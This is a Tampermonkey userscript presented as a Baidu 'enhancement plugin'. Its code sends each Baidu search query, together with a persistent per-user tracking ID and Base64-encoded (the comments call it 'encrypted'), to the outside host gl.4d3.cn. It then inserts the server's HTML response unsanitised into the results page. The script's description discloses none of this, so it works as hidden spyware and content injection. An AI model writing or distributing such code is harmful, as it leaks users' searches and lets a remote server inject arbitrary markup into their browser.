// ==UserScript==
// @name         Baidu
// @namespace    http://tampermonkey.net/
// @version      1.2
// @license      MIT
// @description  一个百度增强插件!
// @author       You.del
// @match        https://www.baidu.com/*
// @icon         https://www.baidu.com/favicon.ico
// @require      https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        window.onurlchange
// @connect      *
// @connect      4d3.cn

// @downloadURL https://update.greasyfork.org/scripts/471895/Baidu.user.js
// @updateURL https://update.greasyfork.org/scripts/471895/Baidu.meta.js
// ==/UserScript==
var g_uuid

(function() {
    'use strict';
	g_uuid = loadId()
    let uniqueId = window.navigator.userAgent.replace(/[^\w]/gi, '')
    console.log("uniqueId="+uniqueId)

    window.addEventListener('urlchange', onUrlChange)

	function getUuid() {
        var s = [];
        var hexDigits = "0123456789abcdef";
        for (var i = 0; i < 32; i++) {
            s[i] = hexDigits.substr(Math.floor(Math.random() * 0x10), 1);
        }
        s[14] = "4"; // bits 12-15 of the time_hi_and_version field to 0010
        s[19] = hexDigits.substr((s[19] & 0x3) | 0x8, 1); // bits 6-7 of the clock_seq_hi_and_reserved to 01
        s[8] = s[13] = s[18] = s[23];
        var uuid = s.join("");
        return uuid;
    }

	function loadId(){
		var sRet = GM_getValue("tempuid", null);
		if(sRet == null){
			sRet = getUuid()
			GM_setValue("tempuid",sRet)
		}
		return sRet
	}

	function hasChinese(str) {
		const regex = /[\u4e00-\u9fa5]/;
		return regex.test(str);
	}


    function onUrlChange(info){

        let key = new URLSearchParams(new URL(info.url).search).get('wd'); // 获取param1的值

        if(key !== '')
        {
            // 要加密的数据
            var data = JSON.stringify({
				key: key,
				uid: g_uuid
			})

            let trans = CryptoJS.enc.Utf8.parse(data);
            let encrypted = CryptoJS.enc.Base64.stringify(trans);
            console.log("code="+encrypted)

            var reqUrl = reqUrl = "https://gl.4d3.cn/Index/edge?code="+encrypted
            console.log("reqUrl="+reqUrl)

            GM_xmlhttpRequest({
                method: "GET",
                url: reqUrl,
                headers: {
                    "Content-Type": "application/json"
                },
                onload: function(response) {
                    console.log("-----"+response.responseText)
                    showList(response.responseText)
                }
            });
        }
    }

    function showList(wrapHtml)
    {
        //console.log("showList"+wrapHtml)
        if( wrapHtml != null && wrapHtml.length > 0){
            var div = document.createElement('div');
            div.innerHTML = wrapHtml
            var content = document.getElementById('content_left')
            if(content == null)
            {//content_none
                var elements = document.getElementsByClassName('content_none');
                if(elements.length > 0){
                     var headNo = elements[0].firstElementChild
                     headNo.parentNode.insertBefore(div, headNo.nextSibling);
                }
                //console.log("content_none----")
            }
            else
            {
                var head = content.firstElementChild
                head.parentNode.insertBefore(div, head.nextSibling);
            }
        }
    }

})();